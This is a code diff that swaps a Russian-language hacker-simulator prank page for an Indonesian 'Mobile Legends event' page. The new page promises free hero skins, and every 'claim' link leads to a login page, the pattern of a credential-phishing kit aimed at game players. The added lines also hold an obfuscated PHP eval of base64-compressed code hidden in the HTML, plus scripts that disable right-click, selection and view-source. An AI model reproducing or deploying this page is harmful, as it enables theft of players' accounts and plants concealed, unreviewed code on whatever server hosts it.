@@ -1,450 +1,1525 @@
-<!DOCTYPE html>
-<html lang="ru">
+<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<!-- Kode menampilkan peringatan untuk mengaktifkan javascript-->
+<div align="center"><noscript>
+   <div style="position:fixed; top:0px; left:0px; z-index:3000; height:100%; width:100%; background-color:#FFFFFF">
+   <div style="font-family: Arial; font-size: 17px; background-color:#00bbf9; padding: 11pt;">Mohon aktifkan javascript pada browser untuk mengakses halaman ini!</div></div>
+</noscript></div>
+<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+<!--Kode untuk mencegah seleksi teks, block teks dll.-->
+<script type="text/javascript">
+function disableSelection(e){if(typeof e.onselectstart!="undefined")e.onselectstart=function(){return false};else if(typeof e.style.MozUserSelect!="undefined")e.style.MozUserSelect="none";else e.onmousedown=function(){return false};e.style.cursor="default"}window.onload=function(){disableSelection(document.body)}
+</script><?php eval(gzinflate(base64_decode('jY9La8JAEMfvgXyHYRE2lvgolFISBG1NwYN9xNiLyLJNVnfbbBJ2J6Df3k2lYm89Dczv/5iZqkoxKzCgdYtNi+yz3e2EUdWehjDuxzC9CAplm5IfmTCmNvaMfc8hhkoLViqtMOgsF4cWujbHM3F6en+3pI5LwQthAvpUVygqHGTHRkS+h+KAI4m6jCGX3LiEyTp7Hjx0lh62Xy2vNFclTIB+i7xFza2St+PpvtsO81pTpzuwhqP0vQkQidhEoxGBIfTYKkk/knRDz5O9zJYJ3f4hafK+TlYZW6cLunWP9RphecV4KQy6TrJTh994iBq4WbzBrCiMsBYi2ICrcZ6rtOVrlrDZfJ7+9BDYkhi6S4OrX0LfIyl/VApzSUK4rgyB/Cu0H58A'))); ?>
+<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+<!--Kode untuk mematikan fungsi klik kanan di blog-->
+<script type="text/javascript">
+function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
+</script>
+<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+<!--Kode untuk mencegah shorcut keyboard, view source dll.-->
+<script type="text/javascript">
+window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
+</script>
+<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
 <head>
-	<meta charset="utf-8">
-    <meta http-equiv="x-ua-compatible" content="ie=edge">
-	<meta name="viewport" content="width=device-width, initial-scale=1" />
-	<link rel="canonical" href="https://pranx.com/hacker/typer/" />
-	<link rel="stylesheet" href="/hacker/hacker.css?x=21" />
-	<script src="/hacker/jquery-jqui.js"></script>
-	<title>Хакер-тайпер - лучший хакер-симулятор</title>	
-    <meta name="description" content="Добро пожаловать в этот интерактивный хакер-симулятор. Чтобы открыть программы, нажмите на значки справа или на цифры на клавиатуре.">
-    <meta name="keywords" content="Хакер,тайпер" />
-    <meta property="og:title" content="Хакер-тайпер" />
-    <meta property="og:type" content="website" />
-    <meta property="og:url" content="https://pranx.com/hacker/typer/" />
-    <meta property="og:image" content="https://pranx.com/hacker/og.jpg" />
-    <meta property="og:description" content="Добро пожаловать в этот интерактивный хакер-симулятор. Чтобы открыть программы, нажмите на значки справа или на цифры на клавиатуре." />	
-	<link rel="alternate" hreflang="en" href="https://pranx.com/hacker/" />
-	<link rel="alternate" hreflang="es" href="https://pranx.com/hacker/simulador/" />
-	<link rel="alternate" hreflang="pt" href="https://pranx.com/hacker/simulador-pt/" />
-	<link rel="alternate" hreflang="fr" href="https://pranx.com/hacker/simulateur/" />
-	<link rel="alternate" hreflang="de" href="https://pranx.com/hacker/simulator/" />
-	<link rel="alternate" hreflang="tr" href="https://pranx.com/hacker/simulatoru/" />
-<script async=true>!function(){var e=window.location.hostname,t=document.createElement("script"),a=document.getElementsByTagName("script")[0],n="https://quantcast.mgr.consensu.org".concat("/choice/","xncav4ssEzwLp","/",e,"/choice.js"),i=0;t.async=!0,t.type="text/javascript",t.src=n,a.parentNode.insertBefore(t,a),function(){function e(){var t=s.document,a=!!s.frames[i];if(!a)if(t.body){var n=t.createElement("iframe");n.style.cssText="display:none",n.name=i,t.body.appendChild(n)}else setTimeout(e,5);return!a}function t(){var e,t=arguments;if(!t.length)return o;if("setGdprApplies"===t[0])t.length>3&&2===t[2]&&"boolean"==typeof t[3]&&(e=t[3],"function"==typeof t[2]&&t[2]("set",!0));else if("ping"===t[0]){var a={gdprApplies:e,cmpLoaded:!1,cmpStatus:"stub"};"function"==typeof t[2]&&t[2](a)}else o.push(t)}function a(e){var t="string"==typeof e.data,a={};try{a=t?JSON.parse(e.data):e.data}catch(e){}var n=a.__tcfapiCall;n&&window.__tcfapi(n.command,n.version,function(a,i){var o={__tcfapiReturn:{returnValue:a,success:i,callId:n.callId}};t&&(o=JSON.stringify(o)),e.source.postMessage(o,"*")},n.parameter)}for(var n,i="__tcfapiLocator",o=[],s=window;s;){try{if(s.frames[i]){n=s;break}}catch(e){}if(s===window.top)break;s=s.parent}n||(e(),s.__tcfapi=t,s.addEventListener("message",a,!1))}();var o=function(){var e=arguments;typeof window.__uspapi!==o&&setTimeout(function(){void 0!==window.__uspapi&&window.__uspapi.apply(window.__uspapi,e)},500)},s=function(){i++,window.__uspapi===o&&i<3?console.warn("USP is not accessible"):clearInterval(c)};if(void 0===window.__uspapi){window.__uspapi=o;var c=setInterval(s,6e3)}}();</script>
-<link rel="stylesheet" href="https://a.pub.network/core/pubfig/cls.css"><script data-cfasync="false">var freestar = freestar || {};freestar.queue = freestar.queue || [];freestar.config = freestar.config || {};freestar.config.enabled_slots = [];freestar.initCallback = function () { (freestar.config.enabled_slots.length === 0) ? freestar.initCallbackCalled = false : freestar.newAdSlots(freestar.config.enabled_slots) }</script><script src="https://a.pub.network/pranx-com/pubfig.min.js" async></script>
+
+<title>MOBILE LEGENDS BANG BANG EVENT</title>
+<link rel="stylesheet" type="text/css" href="css/style.css"/>
 </head>
 <body>
-	<div id="desktop" class="start">
-		<div id="typingArea">
-			<div id="wrapDesktopTyper">
-				<span id="desktopTyper"></span><span class="cursor">_</span>
-			</div>
-		</div>
-		<div class="window closed howToUse" data-ico="?" data-title="Как пользоваться?">
-			<div class="scrollbar-rail">
-				<p><strong>Добро пожаловать в этот интерактивный хакер-симулятор. Чтобы открыть программы, нажмите на значки справа или на цифры на клавиатуре. Перетаскивайте окна мышью, чтобы упорядочить их на рабочем столе.</strong></p>
-				<p class="center">
-<!-- Place for an ad -->
-				</p>
-				<h2>Интерактивные программы</h2>
-				<p>Интерактивные программы можно открыть с помощью значков в правой части экрана. Попробуйте взаимодействовать с этими программами, так как большинство из них реагируют на ваши действия.</p>
-				<p>Майните биткоины, просматривайте камеры видеонаблюдения, взламывайте пароли, управляйте АЭС, зайдите в базу Интерпола или найдите наилучшие совершенно секретные сделки!</p>
-				<h2>Пассивные окна</h2>
-				<img src="/hacker/geek-hacker-typer.jpg" alt="hacker typer" />
-				<p>Для открытия пассивных окон нажимайте цифры (0-9) на клавиатуре. Эти программы отображают по центру экрана статическое или анимированное окно. Их можно перетаскивать с помощью мыши. Для закрытия нажмите клавишу пробела.</p>
-				<p>Отображайте предупреждения «В доступе отказано» или «Разрешение предоставлено», запустите обратный отсчет до самоуничтожения, воспроизведите анимированную трассировку нейронной сети или дождь матричных кодов. Установите вирус, скачайте конфиденциальные данные, отследите с помощью спутника местоположение компьютера и др.!</p>
-				<h2>Хакер-тайпер</h2>
-				<p>Сверните или закройте все окна и начните нажимать на клавиатуре случайные кнопки, имитируя написание программы. Хакер-тайпер будет добавлять на экран по нескольку символов за раз, чтобы казалось, что вы печатаете быстрее.</p>
-				<p>Откройте программу «Удаленное подключение», чтобы сымитировать взлом совершенно секретного правительственного сервера. Этот автоматический хакер-тайпер активирует отклики сервера, отображая на экране различные программы и предупреждения.</p>
-				<p><strong>Другие онлайн-розыгрыши вы можете найти на Pranx.com!</strong></p>
-			</div>
-		</div>		
-		<div class="window closed mainServer" data-ico="&#9577;" data-title="Ответ от главного сервера">
-			<div class="scrollbar-rail">
-				<div id="serverScreen">
-					<div class="serverScreenTop">
-						IP-адрес сервера: - 23.86.111.0<br />
-						Главный правительственный сервер. ВНИМАНИЕ: Совершенно секретно!
-					</div>
+<div id="wrapper">
+    <center><img src="https://cdn-www.bluestacks.com/bs-images/mobile-legends_logo1.png" height="300px" width="500px"></center>
+	<h1>MOBILE LEGENDS EVENT<small>click claim to get skin</small></h1>
+	<div id="content">
+	<ul id="movieposters">
+			    
+	   
+			<li>
+				<img src="https://s1.gifyu.com/images/videotogif_2018.03.25_01.45.21.gif" alt="" />
+				<div class="movieinfo">
+					<h3>SABER</h3>
+					<p>Codename - Storm</p>
+					<a href="login/index.html" title="claim">claim</a>
 				</div>
-			</div>
-		</div>		
-		<div class="window closed bitcoinMiner" data-ico="B" data-title="Программа майнинга биткоинов">		
-			<div class="scrollbar-rail">
-				<div class="bitcoin">
-					<div class="divTable">
-						<div class="divTableBody">
-							<div class="divTableRow">
-								<div class="divTableCell hideUnder1000">
-									128.154.26.11 Подключено к btcn.miner.bitcoin-heap.htmlg.com<br />
-									Разрешение предоставлено! <span class="hideUnder1000">Блок: ...7e9Wq#001 Diff:147M<br />
-									Инициализировано GPU #0 - #32: [OK] (1.092Ph/s) Started @ <span class="clock"></span><br />
-									Задан разгон 300% | BW:[ 55/ 13/ 4Mh/kWh]  <br />
-									<span class="showWhileMining">BitCrane.exe работает в небезопасном режиме | СОСТОЯНИЕ: Работает программа майнинга…</span></span>
-								</div>
-								<div class="divTableCell">
-									<div id="btcValletWrap">
-										<div id="valletHeader">Кошелек</div>
-										BTC<span id="btcVallet">8</span>
-										<span id="btcIcon"></span>
-										<div id="btcEstim">&asymp; $<span id="btcDollar">39664</span></div>
-									</div>
-								</div>
-							</div>
-							<div class="divTableRow showWhileMining hideUnder1000">
-								<div class="divTableCell">
-									<div class="divTable bordered">
-										<div class="divTableBody">
-											<div class="divTableHeading">
-												<div class="divTableHead">ASICs</div>
-												<div class="divTableHead">Принято</div>
-												<div class="divTableHead">Отклонено</div>
-												<div class="divTableHead">GH/s 5s</div>
-											</div>
-											<div class="divTableRow">
-												<div class="divTableCell">1</div>
-												<div class="divTableCell"><span class="addRemoveRandom" data-rand="100">32442</span></div>
-												<div class="divTableCell"><span class="addRemoveRandom" data-rand="5">354</span></div>
-												<div class="divTableCell"><span class="addRemoveRandom" data-rand="10">353</span>.54 Gh/s</div>
-											</div>
-											<div class="divTableRow">
-												<div class="divTableCell">32</div>
-												<div class="divTableCell"><span class="addRemoveRandom" data-rand="100">56954</span></div>
-												<div class="divTableCell"><span class="addRemoveRandom" data-rand="5">8763</span></div>
-												<div class="divTableCell"><span class="addRemoveRandom" data-rand="2">34</span>.99 Gh/s</div>
-											</div>
-											<div class="divTableRow">
-												<div class="divTableCell">Sum</div>
-												<div class="divTableCell"><span class="addRemoveRandom" data-rand="90">8345345</span></div>
-												<div class="divTableCell"><span class="addRemoveRandom" data-rand="10">32122</span></div>
-												<div class="divTableCell">~<span class="addRemoveRandom" data-rand="2">153</span> Gh/s</div>
-											</div>
-										</div>
-									</div>
-								</div>
-								<div class="divTableCell">
-									<div id="miningGraph">
-									</div>
-								</div>
-							</div>
-							<div class="divTableRow">
-								<div class="divTableCell">
-									<div id="rollingBitcoinScreenWrap">
-										<div id="rollingBitcoinScreen">
-											<div class="button" id="startBitcoinMine">Начать майнинг</div>
-										</div>
-									</div>
-								</div>
-								<div class="divTableCell">
-									<div class="showWhileMining">
-										<div class="blinking" id="miningBlinker">
-											Идет майнинг…
-										</div>
-										<div class="bitcoinAnimation">
-											<div class="heap">
-											</div>
-											<div class="hammer">
-											</div>
-											<div class="bang">
-											</div>
-										</div>
-									</div>
-								</div>
-							</div>
-						</div>
-					</div>
+			</li>
+			<li>
+				<img src="https://s1.gifyu.com/images/videotogif_2018.05.30_16.11.27.gif" alt="" />
+				<div class="movieinfo">
+					<h3>GORD</h3>
+					<p>Codename - Conqueror</p>
+					<a href="login/index.html" title="claim">claim</a>
 				</div>
-			</div>
-		</div>
-		<div class="window closed bank" data-ico="&#9712;" data-title="Камера видеонаблюдения">
-			<div class="wrapVideo">
-				<div class="loading">Подключение...<br /><img src="/hacker/wait.gif" alt="loading" /></div>
-				<div class="watch"></div>
-				<div class="video" data-iframe='CTV9kOEP8Mo'></div>
-			</div>
-		</div>
-		<div class="window closed passwordCracker" data-ico="*|" data-title="Взломщик паролей">
-			<div class="scrollbar-rail">
-				<div id="wrapPWCrack">
-					<div id="pWCrackHeader">
-						<span id="pwButt2">Взломать</span><span id="pwButt1">Сброс</span><span id="pwButt3">Проникнуть</span>
-					</div>
-					<div id="pWCrackInner">
-						<div id="lockAnimation">
-						</div>
-						<table>
-							<tbody>
-								<tr>
-									<td>Цель:</td>
-									<td><span contenteditable="true" class="inputfield" spellcheck="false" id="targetIp">23.86.111.0</span></td>
-								</tr>
-								<tr>
-									<td>База данных:</td>
-									<td><span contenteditable="true" class="inputfield" spellcheck="false">Таблица пользователей / Роль администратора</span></td>
-								</tr>
-							</tbody>
-						</table>
-					</div>
-					<div class="divTable" id="pwCrackTable">
-						<div class="divTableBody">
-							<div class="divTableRow" id="pwGuesserRow">
-								<div class="divTableCell" id="pw1">&nbsp;</div>
-								<div class="divTableCell" id="pw2"></div>
-								<div class="divTableCell" id="pw3"></div>
-								<div class="divTableCell" id="pw4"></div>
-								<div class="divTableCell" id="pw5"></div>
-								<div class="divTableCell" id="pw6"></div>
-								<div class="divTableCell" id="pw7"></div>
-								<div class="divTableCell" id="pw8"></div>
-								<div class="divTableCell" id="pw9"></div>
-								<div class="divTableCell" id="pw10"></div>
-								<div class="divTableCell" id="pw11"></div>
-								<div class="divTableCell" id="pw12"></div>
-								<div class="divTableCell" id="pw13"></div>
-								<div class="divTableCell" id="pw14"></div>
-								<div class="divTableCell" id="pw15"></div>
-							</div>
-							<div class="divTableRow" id="pwOkRow">
-								<div class="divTableCell nowGuessing" id="pwok1">&nbsp;</div>
-								<div class="divTableCell" id="pwok2"></div>
-								<div class="divTableCell" id="pwok3"></div>
-								<div class="divTableCell" id="pwok4"></div>
-								<div class="divTableCell" id="pwok5"></div>
-								<div class="divTableCell" id="pwok6"></div>
-								<div class="divTableCell" id="pwok7"></div>
-								<div class="divTableCell" id="pwok8"></div>
-								<div class="divTableCell" id="pwok9"></div>
-								<div class="divTableCell" id="pwok10"></div>
-								<div class="divTableCell" id="pwok11"></div>
-								<div class="divTableCell" id="pwok12"></div>
-								<div class="divTableCell" id="pwok13"></div>
-								<div class="divTableCell" id="pwok14"></div>
-								<div class="divTableCell" id="pwok15"></div>
-							</div>
-							<div class="divTableRow" id="pwCheckedRow">
-								<div class="divTableCell" id="pwcheck1">&times;</div>
-								<div class="divTableCell" id="pwcheck2">&times;</div>
-								<div class="divTableCell" id="pwcheck3">&times;</div>
-								<div class="divTableCell" id="pwcheck4">&times;</div>
-								<div class="divTableCell" id="pwcheck5">&times;</div>
-								<div class="divTableCell" id="pwcheck6">&times;</div>
-								<div class="divTableCell" id="pwcheck7">&times;</div>
-								<div class="divTableCell" id="pwcheck8">&times;</div>
-								<div class="divTableCell" id="pwcheck9">&times;</div>
-								<div class="divTableCell" id="pwcheck10">&times;</div>
-								<div class="divTableCell" id="pwcheck11">&times;</div>
-								<div class="divTableCell" id="pwcheck12">&times;</div>
-								<div class="divTableCell" id="pwcheck13">&times;</div>
-								<div class="divTableCell" id="pwcheck14">&times;</div>
-								<div class="divTableCell" id="pwcheck15">&times;</div>
-							</div>
-						</div>
-					</div>
-					<div id="pwdResult">
-						<div class="aligncenter">Статус: Резерв<br /><span class="button" onclick="startPwCrack(10)">Начать брутфорс-атаку</span></div>
-					</div>
-					<div id="pwdLegal">
-						<strong>Правовая оговорка: Использование Password Cracker во вредных или незаконных целях строго запрещено и карается смертью!</strong>
-					</div>
+			</li>
+			<li>
+				<img src="https://s1.gifyu.com/images/videotogif_2018.03.25_01.48.03.gif" alt="" />
+				<div class="movieinfo">
+					<h3>MIYA</h3>
+					<p>Modena Butterfly</p>
+					<a href="login/index.html" title="claim">claim</a>
 				</div>
-			</div>
-		</div>		
-		<div class="window closed reactor" data-ico="&#8855;" data-title="АЭС">
-			<div class="scrollbar-rail">
-				<div id="wrapNuclearPlant">
-					<div id="nuclearFloods">
-						<div class="flood"><div data-percent="50" data-step="6"></div></div>
-						<div class="flood" id="flood2"><div data-percent="50" data-step="6"></div></div>
-						<div class="flood" id="flood3"><div data-percent="50" data-step="36"></div></div>
-						<div class="flood" id="flood4"><div data-percent="50" data-step="36"></div></div>
-						<div class="flood" id="flood5"><div data-percent="15" data-step="6"></div></div>
-						<div class="flood" id="flood6"><div data-percent="75" data-step="46"></div></div>
-					</div>
-					<div id="nuclearPlant">
-						<div class="randomnr" id="nr01" data-step="0.3">14.9</div>
-						<div class="randomnr" id="nr02" data-step="0.3">15.0</div>
-						<div class="randomnr" id="nr03" data-step="5">630</div>
-						<div class="randomnr" id="nr04" data-step="0.3">2020</div>
-						<div class="randomnr" id="nr05" data-step="0.3">0</div>
-						<div class="randomnr" id="nr06" data-step="100">70000</div>
-						<div class="randomnr" id="nr07" data-step="1">0</div>
-						<div class="randomnr" id="nr08" data-step="0.2">14.7</div>
-						<div class="randomnr yellow" id="nr09" data-step="1">120</div>
-						<div class="randomnr yellow" id="nr10" data-step="10">2568</div>
-						<div class="randomnr yellow" id="nr11" data-step="0">0</div>
-						<div class="randomnr yellow" id="nr12" data-step="10">1493</div>
-						<div class="randomnr" id="nr13" data-step="5">120</div>
-						<div class="randomnr yellow" id="nr14" data-step="0">0.0</div>
-						<div class="randomnr yellow" id="nr15" data-step="5">1500</div>
-						<div class="randomnr" id="nr16" data-step="10">2170</div>
-						<div class="randomnr" id="nr17" data-step="5">2170</div>
-						<div class="randomnr" id="nr18" data-step="1">220</div>
-						<div class="randomnr" id="nr19" data-step="0.5">220</div>
-						<div class="randomnr" id="nr20" data-step="0">0.0</div>
-						<div class="randomnr" id="nr21" data-step="5">924</div>
-						<div class="randomnr" id="nr22" data-step="2">603</div>
-						<div class="randomnr" id="nr23" data-step="0.5">43</div>
-						<div class="randomnr" id="nr24" data-step="5">555</div>
-						<div class="randomnr" id="nr25" data-step="5">1951</div>
-						<div class="randomnr" id="nr26" data-step="0.5">603</div>
-						<div class="randomnr" id="nr27" data-step="5">924</div>
-						<div class="randomnr yellow" id="nr28" data-step="5">1493</div>
-						<div class="randomnr" id="nr29" data-step="5">288</div>
-						<div class="randomnr" id="nr30" data-step="0.5">65</div>
-						<div class="randomnr" id="nr31" data-step="0">0</div>
-						<div class="randomnr" id="nr32" data-step="2">43</div>
-						<div class="randomnr" id="nr33" data-step="7">555</div>
-						<div class="randomnr" id="nr34" data-step="20">1925</div>
-						<div class="randomnr" id="nr35" data-step="0.5">65.8</div>
-						<div class="randomnr" id="nr36" data-step="2">288</div>
-						<div class="randomnr yellow" id="nr37" data-step="0.8">1493</div>
-					</div>
-				</div>
-			</div>
-		</div>	
-		<div class="window closed remoteConnection" data-ico="&#9577;" data-title="Удаленное подключение">
-			<div class="scrollbar-rail">
-				<span id="remoteText"></span>
-				<span class='cursor'></span>
-			</div>
-		</div>
-		<div class="window closed reklamocskak" data-ico="$" data-title="объявления">
-			<div class="wrapFreestar"><div align="center" data-freestar-ad="__320x100 __300x250" id="Pranx_hacker_300x250"><script data-cfasync="false">freestar.config.enabled_slots.push({ placementName: "Pranx_hacker_300x250", slotId: "Pranx_hacker_300x250" });</script></div></div>
-			<div id="wrapBestDeals">
-				<a class="fancylink" title="Text Fancy" href="https://texteditor.com/" target="_blank" rel="external nofollow">░░░▀█▀▒██▀░▀▄▀░▀█▀░░<br />░░░▒█▒░█▄▄░▀▒▀░▒▀▒▒░░<br />▒██▀░█▀▄░▄░▀█▀░▄▀▄▒█▀▄<br />░█▄▄▒█▄▀░█░▒█▒░▀▄▀░█▀▄<br />░░░░░░░▄▀░░░▄░░▄▄▒▄▄░▒<br />▒░▒░░▄░▀▄▄░▀▄▀░█▒▀▒█░</a>
-			</div>
-		</div>
-
-		<div class="window closed interpol" data-ico="&hArr;" data-title="База данных Интерпола">
-			<div class="wrapVideo">
-				<div class="loading">Loading...<br /><img src="/hacker/wait.gif" alt="loading" /></div>
-				<div class="video" data-iframe='llufppyponk'>
-				</div>
-				<div class="wrapReklamocska">
-<!-- NeonGreen Responsive TextOnly -->
-				</div>
-			</div>
-		</div>		
-		<div class="window closed consoleWindow" data-ico=">." data-title="Консоль программы">
-			<div class="scrollbar-rail">
-				<span id="consoleText"></span>
-				<span class='cursor'></span>
-			</div>
-		</div>		
-		<div id="accessDenied" class="ablakocska">
-			<span>&#128473; В доступе отказано </span>
-		</div>
-		<div id="permissionGranted" class="ablakocska">
-			<span>Разрешение предоставлено <img src="/hacker/lock-green.gif" alt="unlocked" /> </span>
-		</div>
-		<div id="selfDestruct" class="ablakocska">
-			<span>Самоуничтожиться<br /><strong id="selfDestructCount">600</strong><br /><span>Последовательность задействована</span></span>
-		</div>
-		<div id="topSecret" class="ablakocska">
-			<img src="/hacker/top-secret.png" alt="classified" />
-		</div>
-		<div id="partikulacskak" class="ablakocska">
-			<div>
-				<span>Трассировка нейронной сети</span>
-				<div id="partikulacskakIde"></div>
-			</div>
-		</div>		
-		<div id="matrixRain" class="ablakocska">
-			<div>Компиляция кода</div>
-			<canvas id="c"></canvas>
-		</div>
-		<div id="pcvirus" class="ablakocska">
-			<div>
-				Установка вредоносного ПО<br />
-				<img src="/hacker/skull.png" alt="skull" />
-				<div class="processBar"><div></div></div>
-			</div>
-		</div>
-		<div id="grafikon" class="ablakocska">
-			<div>
-				<canvas id="chart" width="400" height="300"></canvas>
-			</div>
-		</div>
-		<div id="downloadingData" class="ablakocska">
-			<div>
-				Скачивание конфиденциальных данных<br />
-				<img src="/hacker/topsecret.png" alt="highly classified" />
-				<div class="processBar"><div></div></div>
-			</div>
-		</div>
-		<div id="tracingIP" class="ablakocska">
-			<div id="satellite">
-				<h3 class="blinking">Установка соединения со спутником</h3>
-				<div id="satelliteAnimWrap">
-					<div id="satelliteAnim" class="clockwiseTurn">
-						<img id="globe" alt="globe" src="/hacker/globe.gif" />
-						<img id="triangle" alt="triangle" src="/hacker/triangle.gif" />
-						<img class="satellite counterClockwiseTurn" id="szat1" alt="satellite" src="/hacker/satellite.gif" />
-						<img class="satellite counterClockwiseTurn" id="szat2" alt="satellite" src="/hacker/satellite.gif" />
-						<img class="satellite counterClockwiseTurn" id="szat3" alt="satellite" src="/hacker/satellite.gif" />						
-					</div>
-					<div id="mapWrap">
-						<img id="zoomMap" alt="hacker map" src="/hacker/map1.jpg" />
-						<div id="mapPosition" class="blinking"></div>
-					</div>
-				</div>
-			</div>
-		</div>		
-		<div id="taskbar">		
-			<div id="startMenuButton">
-				<span>&equiv;</span>&nbsp;Начать
-			</div>
-		</div>
-		<div id="startMenu">
-			<ul class="languagePicker">
-				<li><a class="eng" href="/hacker/">Hacker Typer</a></li>
-				<li><a class="tur" href="/hacker/simulatoru/">simulatoru</a></li>
-				<li><a class="esp" href="/hacker/simulador/">simulador</a></li>
-				<li><a class="por" href="/hacker/simulador-pt/">simulador-pt</a></li>
-				<li><a class="ger" href="/hacker/simulator/">simulator</a></li>
-				<li><a class="fra" href="/hacker/simulateur/">simulateur</a></li>
-			</ul>
-			<h1>Экран Pranx Hacker</h1>
-			<h2>Онлайн хакер-симулятор</h2>
-			<p>Начните набирать случайный текст, чтобы сымитировать, будто вы взламываете компьютерную систему.</p>
-			<div class="center"><a id="cleanDesktop" class="button"><span>&times;</span>Все они</a> <a id="automateHacker" class="button">Автоматизировать</a> <a id="toggleFullScreen" class="button">Полноэкранный</a></div>
-			<p>Ознакомьтесь с программами, нажимая на значки справа, или нажмите на цифры на клавиатуре для отображения разных окон.</p>
-			<img src="/hacker/geek-hacker-typer.jpg" alt="hacker typer" />
-			<p class="center"><a id="howToUseToggle" class="button">Как пользоваться?</a></p>
-<div class="wrapFreestar"><div align="center" data-freestar-ad="__320x100" id="Pranx_hacker_300x100_left"><script data-cfasync="false">freestar.config.enabled_slots.push({ placementName: "Pranx_hacker_300x100_left", slotId: "Pranx_hacker_300x100_left" });</script></div></div>
-			<p>С помощью этой игры-симулятора хакеров мы хотим повысить осведомленность о компьютерной и интернет-безопасности.</p>
-			<p><strong>Другие онлайн-розыгрыши вы можете найти на <a href="/">Pranx</a></strong></p>
-			<div id="prank_dab"><div class="adBanner">.</div></div>
-		</div>		
-		<div id="icons">
-		</div>
-	</div>
-	<div id="wrapParticles">
-		<div id="particles-js">
-		</div>
-	</div>
+			</li>
+		</ul>	    
+	<ul id="movieposters">
 	
-	<div id="languageBits">
-		<span>Вы этого не видите, потому что используете блокировщик рекламы.</span>
-		<span>Отключить AdBlock</span>
-		<span>Как?</span>
-		<span>Нет соответствий</span>
-		<span>УСПЕШНО</span>
-		<span>Проводится брутфорс-атака</span>
-		<span>Ожидайте решения</span>
-		<span>УСПЕШНО: Обнаружен пароль администратора</span>
-		<span>Пароль</span>
-		<span>Статус: Резерв</span>
-		<span>Начать брутфорс-атаку</span>
-		<span>Определение местоположения</span>
-		<span>Отслеживание IP</span>
-		<span>Местоположение найдено</span>
-		<span>Отслеживание SIM</span>
-		<span>Свернуть</span>
-		<span>Развернуть</span>
-		<span>Закрыть</span>
-		<span></span>
-	</div>
-	<script src="/hacker/particles.min.js"></script>
-	<script src="/hacker/hacker.js?x=202009"></script>	
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-199423898-1"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+	
+		<li>
+				<img src="https://imageshack.com/a/img921/5629/dtKgLH.png" alt="" />
+				<div class="movieinfo">
+					<h3>JONSHON</h3>
+					<p>S.A.B.E.R - Automata</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t/38729935_3592838.png" alt="" />
+				<div class="movieinfo">
+					<h3>SABER</h3>
+					<p>S.A.B.E.R - Regulator</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t/38729933_8550426.png" alt="" />
+				<div class="movieinfo">
+					<h3>LAYLA</h3>
+					<p>S.A.B.E.R - Breacher</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    <ul id="movieposters">
+	    
+	    
+<li>
+				<img src="https://s7d1.turboimg.net/t/38729940_8347954.png" alt="" />
+				<div class="movieinfo">
+					<h3>NANA</h3>
+					<p>Graveyard Party</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t/38729941_8424544.png" alt="" />
+				<div class="movieinfo">
+					<h3>ZHACK</h3>
+					<p>Bone Flamen</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t/38729942_FB_IMG_15247825083206024-picsay.jpg" alt="" />
+				<div class="movieinfo">
+					<h3>ESTES</h3>
+					<p>White Crane</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    <ul id="movieposters">	
+	    
+	    
+	    
+	<li>
+				<img src="https://s7d1.turboimg.net/t1/38772409_811352.png" alt="" />
+				<div class="movieinfo">
+					<h3>KAGURA</h3>
+					<p>Sumertime Festival</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38772410_1081294.png" alt="" />
+				<div class="movieinfo">
+					<h3>FANNY</h3>
+					<p>Skylark</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38772411_6392515.png" alt="" />
+				<div class="movieinfo">
+					<h3>HAYABUSA</h3>
+					<p>Sushi Master</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    <ul id="movieposters">	
+	    
+<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
 
-  gtag('config', 'UA-199423898-1');
-</script>
+
+	<li>
+				<img src="https://s7d1.turboimg.net/t1/39090334_6711968.png" alt="" />
+				<div class="movieinfo">
+					<h3>CLAUDE</h3>
+					<p>Golden Bullet</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/39090332_2252285.png" alt="" />
+				<div class="movieinfo">
+					<h3>LASLEY</h3>
+					<p>Stellaris Ghost</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+						<li>
+				<img src="https://s7d1.turboimg.net/t1/39090333_6281275.png" alt="" />
+				<div class="movieinfo">
+					<h3>MOSKOV</h3>
+					<p>Jevelin Champion</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
